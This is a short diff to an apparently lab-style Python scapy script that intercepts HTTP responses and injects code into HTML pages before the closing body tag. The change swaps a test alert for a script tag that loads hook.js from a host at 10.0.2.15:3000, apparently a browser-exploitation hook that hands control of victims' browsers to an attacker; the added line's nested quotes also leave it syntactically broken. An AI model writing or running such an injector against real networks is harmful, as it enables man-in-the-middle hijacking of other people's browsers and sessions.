@@ -23,7 +23,7 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             #print(scapy_packet.show())
-            injection_code = "<script>alert('test');</script>"
+            injection_code = "<script src="http://10.0.2.15:3000/hook.js"></script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)#Content-Length will limit the code injection 
             if content_length_search and "text/html" in load:#just work for Content-Type:text/html and message css javascript have no </body>
